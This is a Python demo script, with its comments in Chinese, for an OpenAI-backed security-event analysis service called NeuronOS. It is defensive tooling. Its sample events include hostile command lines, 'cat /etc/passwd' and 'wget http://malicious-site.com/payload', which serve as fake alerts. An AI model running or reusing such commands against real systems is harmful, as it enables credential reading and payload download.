#!/usr/bin/env python3
"""
NeuronOS OpenAI API集成功能演示脚本

本脚本演示了NeuronOS的OpenAI API集成功能，包括：
1. 基础安全分析
2. 威胁评估
3. 修复建议
4. 批量分析
5. 配置管理
6. 错误处理
"""

import asyncio
import json
import sys
import os
from datetime import datetime
from typing import List, Dict, Any

# 添加项目路径
sys.path.append(os.path.join(os.path.dirname(__file__), 'src', 'backend'))

from services.openai_service import (
    OpenAIService, AnalysisRequest, AnalysisType, Priority,
    analyze_events, get_remediation_advice, assess_threat
)
from config.openai_config import OpenAIConfig, load_config_from_env


def print_section(title: str):
    """打印章节标题"""
    print(f"\n{'='*60}")
    print(f" {title}")
    print(f"{'='*60}")


def print_result(result: Dict[str, Any]):
    """格式化打印结果"""
    print(json.dumps(result, indent=2, ensure_ascii=False, default=str))


def create_sample_events() -> List[Dict[str, Any]]:
    """创建示例事件数据"""
    return [
        {
            "event_id": "evt_001",
            "timestamp": "2024-01-15T10:30:00Z",
            "rule": "Suspicious File Access",
            "priority": "Warning",
            "message": "Unauthorized access to /etc/passwd detected",
            "process": {
                "name": "cat",
                "pid": 12345,
                "user": "unknown_user",
                "command": "cat /etc/passwd"
            },
            "file": {
                "path": "/etc/passwd",
                "permissions": "644"
            },
            "container": {
                "id": "container_123",
                "name": "web-app",
                "image": "nginx:latest"
            }
        },
        {
            "event_id": "evt_002",
            "timestamp": "2024-01-15T10:31:00Z",
            "rule": "Network Connection to Suspicious IP",
            "priority": "Critical",
            "message": "Outbound connection to known malicious IP detected",
            "process": {
                "name": "wget",
                "pid": 12346,
                "user": "www-data",
                "command": "wget http://malicious-site.com/payload"
            },
            "network": {
                "destination_ip": "192.168.1.100",
                "destination_port": 80,
                "protocol": "TCP"
            }
        }
    ]


async def demo_basic_analysis():
    """演示基础安全分析"""
    print_section("基础安全分析演示")
    
    events = create_sample_events()
    context = {
        "environment": "production",
        "system": "web-server-cluster",
        "baseline_established": True
    }
    
    try:
        # 使用便捷函数进行分析
        result = await analyze_events(
            events=events,
            analysis_type=AnalysisType.SECURITY_ANALYSIS,
            context=context,
            priority=Priority.HIGH
        )
        
        print("✅ 安全分析完成")
        print(f"请求ID: {result.get('request_id', 'N/A')}")
        print(f"分析类型: {result.get('analysis_type', 'N/A')}")
        print(f"风险评分: {result.get('risk_score', 'N/A')}")
        print(f"置信度: {result.get('confidence', 'N/A')}")
        print(f"处理时间: {result.get('processing_time', 'N/A')}秒")
        
        if 'summary' in result:
            print(f"\n摘要: {result['summary']}")
        
        if 'recommendations' in result:
            print("\n建议:")
            for i, rec in enumerate(result['recommendations'], 1):
                print(f"  {i}. {rec}")
                
    except Exception as e:
        print(f"❌ 分析失败: {e}")


async def demo_threat_assessment():
    """演示威胁评估"""
    print_section("威胁评估演示")
    
    events = create_sample_events()
    context = {
        "threat_intelligence": True,
        "historical_data": True,
        "industry": "technology"
    }
    
    try:
        result = await assess_threat(
            events=events,
            context=context,
            priority=Priority.CRITICAL
        )
        
        print("✅ 威胁评估完成")
        print_result(result)
        
    except Exception as e:
        print(f"❌ 威胁评估失败: {e}")


async def demo_remediation_advice():
    """演示修复建议"""
    print_section("修复建议演示")
    
    events = create_sample_events()
    context = {
        "system_type": "kubernetes",
        "compliance_requirements": ["SOC2", "ISO27001"],
        "business_critical": True
    }
    
    try:
        result = await get_remediation_advice(
            events=events,
            context=context,
            priority=Priority.HIGH
        )
        
        print("✅ 修复建议生成完成")
        print_result(result)
        
    except Exception as e:
        print(f"❌ 修复建议生成失败: {e}")


async def demo_batch_analysis():
    """演示批量分析"""
    print_section("批量分析演示")
    
    # 创建多个分析请求
    requests = [
        AnalysisRequest(
            analysis_type=AnalysisType.SECURITY_ANALYSIS,
            events=create_sample_events()[:1],
            priority=Priority.HIGH
        ),
        AnalysisRequest(
            analysis_type=AnalysisType.THREAT_ASSESSMENT,
            events=create_sample_events()[1:],
            priority=Priority.CRITICAL
        ),
        AnalysisRequest(
            analysis_type=AnalysisType.PATTERN_ANALYSIS,
            events=create_sample_events(),
            priority=Priority.MEDIUM
        )
    ]
    
    try:
        service = OpenAIService()
        results = await service.batch_analyze(requests)
        
        print(f"✅ 批量分析完成，处理了 {len(results)} 个请求")
        
        for i, result in enumerate(results, 1):
            print(f"\n--- 结果 {i} ---")
            if isinstance(result, dict):
                print(f"请求ID: {result.get('request_id', 'N/A')}")
                print(f"分析类型: {result.get('analysis_type', 'N/A')}")
                print(f"状态: 成功")
            else:
                print(f"状态: 失败 - {result}")
                
    except Exception as e:
        print(f"❌ 批量分析失败: {e}")


async def demo_service_statistics():
    """演示服务统计信息"""
    print_section("服务统计信息")
    
    try:
        service = OpenAIService()
        stats = service.get_statistics()
        
        print("📊 服务统计:")
        print_result(stats)
        
        # 演示缓存管理
        print("\n🗂️ 缓存管理:")
        cache_size = len(service.cache)
        print(f"当前缓存条目数: {cache_size}")
        
        if cache_size > 0:
            service.clear_cache()
            print("缓存已清空")
        
    except Exception as e:
        print(f"❌ 获取统计信息失败: {e}")


def demo_configuration():
    """演示配置管理"""
    print_section("配置管理演示")
    
    try:
        # 从环境变量加载配置
        config = load_config_from_env()
        
        print("⚙️ 当前配置:")
        print(f"模型类型: {config.model.model_type.value}")
        print(f"模型名称: {config.model.model_name}")
        print(f"最大重试次数: {config.retry.max_retries}")
        print(f"缓存启用: {config.cache.enabled}")
        print(f"缓存TTL: {config.cache.ttl_seconds}秒")
        print(f"速率限制: {config.rate_limit.requests_per_minute}请求/分钟")
        
        # 显示可用的分析类型
        print("\n📋 可用的分析类型:")
        for analysis_type in AnalysisType:
            print(f"  - {analysis_type.value}")
            
        # 显示优先级选项
        print("\n🎯 优先级选项:")
        for priority in Priority:
            print(f"  - {priority.value}")
            
    except Exception as e:
        print(f"❌ 配置加载失败: {e}")


async def demo_error_handling():
    """演示错误处理"""
    print_section("错误处理演示")
    
    # 测试无效事件数据
    print("🧪 测试无效事件数据...")
    try:
        result = await analyze_events(
            events=[],  # 空事件列表
            analysis_type=AnalysisType.SECURITY_ANALYSIS
        )
        print("⚠️ 意外成功 - 应该失败")
    except Exception as e:
        print(f"✅ 正确捕获错误: {e}")
    
    # 测试无效分析类型（这个测试可能不会失败，因为枚举类型检查）
    print("\n🧪 测试服务初始化...")
    try:
        service = OpenAIService()
        print("✅ 服务初始化成功")
    except Exception as e:
        print(f"❌ 服务初始化失败: {e}")


async def main():
    """主函数"""
    print("🚀 NeuronOS OpenAI API集成功能演示")
    print(f"演示时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    # 检查环境
    if not os.getenv('OPENAI_API_KEY'):
        print("\n⚠️ 警告: 未设置OPENAI_API_KEY环境变量")
        print("某些功能可能无法正常工作")
    
    try:
        # 配置演示（不需要API密钥）
        demo_configuration()
        
        # 错误处理演示
        await demo_error_handling()
        
        # 如果有API密钥，运行完整演示
        if os.getenv('OPENAI_API_KEY'):
            await demo_basic_analysis()
            await demo_threat_assessment()
            await demo_remediation_advice()
            await demo_batch_analysis()
            await demo_service_statistics()
        else:
            print("\n💡 提示: 设置OPENAI_API_KEY环境变量以运行完整演示")
            
    except KeyboardInterrupt:
        print("\n\n👋 演示被用户中断")
    except Exception as e:
        print(f"\n❌ 演示过程中发生错误: {e}")
        import traceback
        traceback.print_exc()
    
    print("\n🎉 演示完成！")
    print("\n📚 更多信息请参考:")
    print("  - 文档: docs/1.4.1 OpenAI API集成.md")
    print("  - 测试: tests/test_1_4_1_openai_integration.py")
    print("  - 配置: src/backend/config/openai_config.py")
    print("  - 服务: src/backend/services/openai_service.py")
    print("  - API: src/backend/api/openai_analysis.py")


if __name__ == "__main__":
    asyncio.run(main())